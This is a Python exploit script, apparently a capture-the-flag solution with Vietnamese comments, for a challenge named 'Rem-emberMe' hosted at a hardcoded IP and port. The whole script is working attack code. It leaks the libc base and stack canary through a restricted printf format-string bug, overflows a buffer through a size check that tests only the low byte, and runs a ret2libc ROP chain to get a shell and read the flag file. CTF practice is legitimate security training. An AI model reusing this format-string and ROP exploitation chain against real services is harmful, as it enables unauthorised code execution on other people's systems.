#!/usr/bin/env python3
# Rem-emberMe — format string (leak libc + canary) rồi ret2libc qua lỗi length mismatch.
import socket, struct, sys, time, re

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("103.116.52.180", 23825)
# offset trong libc.so.6 kèm theo (GLIBC 2.39)
PUTS, SYS, BINSH, POP_RDI, RET = 0x87CC0, 0x58750, 0x1CC42F, 0x10C08D, 0x10C08E
def p64(x): return struct.pack("<Q", x)
u = lambda n: n & 0xFFFFFFFFFFFFFFFF

s = socket.create_connection((HOST, PORT), timeout=15); s.settimeout(3)
def recv():
    b = b""
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            b += d
    except socket.timeout:
        pass
    return re.sub(rb"\x1b\[[0-9;]*m", b"", b)
time.sleep(1); recv()

def leak(fmt):
    # Menu 4 "Cor Leonis": printf(buf, "Natsuki Subaru", puts_libc, "Pleiades...")
    # validator: strlen(buf) <= 7, chỉ cho %d/%i với hljztL * $ -> vừa đủ cho %N$lld
    s.sendall(b"4\n"); time.sleep(0.4); recv()
    s.sendall(fmt + b"\n"); time.sleep(0.6)
    return int(re.findall(r"-?\d{4,}", recv().decode("latin1"))[0])

base = u(leak(b"%2$lld")) - PUTS      # arg2 (rdx) = địa chỉ puts của libc
canary = u(leak(b"%35$lld"))          # arg35 = stack canary
assert canary & 0xFF == 0

# Menu 5 "Book of the Dead": size bị check theo byte thấp (n&0xff in [1,0x80])
# nhưng read_n dùng full n. Chọn n=0x180 -> low byte 0x80 qua check, đọc 384 byte.
rop = p64(base + RET) + p64(base + POP_RDI) + p64(base + BINSH) + p64(base + SYS)
payload = b"A" * 0x88 + p64(canary) + p64(base + 0x100000) + rop   # buf[0x90]-0x8 = canary
payload = payload.ljust(0x180, b"\x90")   # phải gửi đủ 384 byte, không read_n sẽ block

s.sendall(b"5\n"); time.sleep(0.4); recv()
s.sendall(b"384\n"); time.sleep(0.4); recv()
s.sendall(payload); time.sleep(0.8); recv()

s.sendall(b"cat /home/*/flag.txt\n"); time.sleep(1.2)
print(recv().decode("latin1"))
